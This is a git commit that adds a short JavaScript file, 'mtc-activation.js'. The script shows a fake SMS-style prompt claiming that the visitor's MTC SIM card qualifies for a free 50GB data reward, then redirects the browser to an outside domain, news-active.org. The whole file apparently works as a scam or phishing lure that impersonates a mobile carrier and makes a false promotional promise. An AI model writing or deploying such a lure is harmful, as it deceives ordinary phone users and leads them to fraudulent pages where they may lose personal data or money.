be11922c4b143de0a4d5a85a72feaf29620d5cd4
ekpeowo <ukpehansi@gmail.com>
2025-08-06 13:04:55 +0100

    Create mtc-activation.js

---
+++ mtc-activation.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your MTC SIM card is eligible to receive free data old sim card reward, click OK to activate now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://news-active.org/mtc.html';
+}
